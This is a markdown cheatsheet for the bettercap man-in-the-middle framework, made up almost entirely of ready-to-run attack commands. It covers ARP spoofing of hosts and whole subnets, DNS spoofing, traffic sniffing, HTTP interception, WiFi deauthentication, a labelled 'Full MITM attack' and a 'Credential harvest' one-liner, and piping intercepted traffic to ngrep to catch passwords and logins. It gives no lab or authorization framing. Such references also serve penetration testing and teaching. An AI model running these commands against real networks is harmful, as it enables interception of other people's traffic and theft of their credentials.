---
title: "bettercap - Quick Reference Cheatsheet"
description: "Quick reference card for bettercap MITM framework"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
tags: [bettercap, mitm, cheatsheet, arp-spoofing, network-attack]
---

# bettercap — Cheatsheet

## Quick Start

```bash
# Install
sudo apt install bettercap

# Start interactive session
sudo bettercap -iface eth0

# Run caplet
sudo bettercap -iface eth0 -caplet attack.cap

# Single command execution
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; exit"
```

## Core Commands

| Command | Description |
|---------|-------------|
| `help` | List all commands |
| `help <module>` | Module help |
| `modules` | List modules |
| `active` | List active modules |
| `exit` | Exit bettercap |

## Module Control

```bash
# Start modules
net.probe on
net.recon on
arp.spoof on
dns.spoof on
net.sniff on
http.proxy on
wifi.recon on
ble.recon on

# Stop modules
net.probe off
arp.spoof off
dns.spoof off
net.sniff off
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-iface` | Network interface |
| `-eval` | Execute commands |
| `-caplet` | Run caplet file |
| `-proxy` | HTTP proxy port |
| `-debug` | Debug logging |
| `-verbose` | Verbose output |
| `-sniffer` | Enable sniffer |
| `-pcap` | Write pcap file |
| `-gateway` | Override gateway |

## ARP Spoofing

```bash
# Basic ARP spoof
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Full duplex (both directions)
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Spoof entire subnet
set arp.spoof.targets 192.168.1.0/24
arp.spoof on

# Exclude gateway
set arp.spoof.whitelist 192.168.1.1
arp.spoof on
```

## DNS Spoofing

```bash
# Spoof all DNS to specific IP
set dns.spoof.address 192.168.1.200
set dns.spoof.all true
dns.spoof on

# Spoof specific domains
set dns.spoof.domains example.com,evil.com
set dns.spoof.address 192.168.1.200
dns.spoof on
```

## Packet Sniffing

```bash
# Basic sniffing
net.sniff on

# With pcap output
set net.sniff.pcap capture.pcap
net.sniff on

# Verbose mode
set net.sniff.verbose true
net.sniff on

# With filters
set net.sniff.filters "port 80"
net.sniff on
```

## HTTP Proxy

```bash
# Start HTTP proxy
set http.proxy.port 8080
http.proxy on

# With ARP spoof
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.100
arp.spoof on
set http.proxy.port 8080
http.proxy on
```

## WiFi Attacks

```bash
# WiFi recon
wifi.recon on

# Deauth specific BSSID
wifi.deauth <BSSID>

# Stop deauth
wifi.deauth off
```

## Examples

```bash
# Quick host discovery
sudo bettercap -iface eth0 -eval "net.probe on; sleep 15; net.probe off; exit"

# Full MITM attack
sudo bettercap -iface eth0 -eval "
net.probe on; sleep 5;
set arp.spoof.fullduplex true;
set arp.spoof.targets 192.168.1.100;
arp.spoof on;
net.sniff on;
sleep 60;
exit"

# Passive recon
sudo bettercap -iface eth0 -eval "net.recon on; sleep 30; exit"

# Credential harvest
sudo bettercap -iface eth0 -proxy 8080 -eval "
net.probe on; sleep 5;
set arp.spoof.fullduplex true;
arp.spoof on;
http.proxy on;
net.sniff on;
sleep 300; exit"
```

## Chaining

```bash
# bettercap + tcpdump
sudo bettercap -iface eth0 -eval "arp.spoof on; net.sniff on; sleep 60" &
sudo tcpdump -i eth0 -w full_capture.pcap &
wait

# bettercap + ngrep for credentials
sudo bettercap -iface eth0 -eval "arp.spoof on; net.sniff on; sleep 60" &
sudo ngrep -l -q -d eth0 "PASS|USER|LOGIN" &
wait
```

## Caplet Syntax

```javascript
// Variables
set myvar "value"

// Conditionals
if (condition) { action }

// Loops
while (true) { action; sleep 5 }

// Events
on event:name { handler }

// Functions
function myFunc() { action }
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Permission denied | `sudo bettercap -iface eth0` |
| Interface not found | `ip link show` to list interfaces |
| ARP spoof not working | Enable IP forwarding: `sysctl -w net.ipv4.ip_forward=1` |
| No HTTPS intercepted | Configure HTTPS proxy or use SSLstrip |
| WiFi not working | Use monitor mode interface: `-iface wlan0mon` |
| Module won't start | Check module help: `help <module>` |
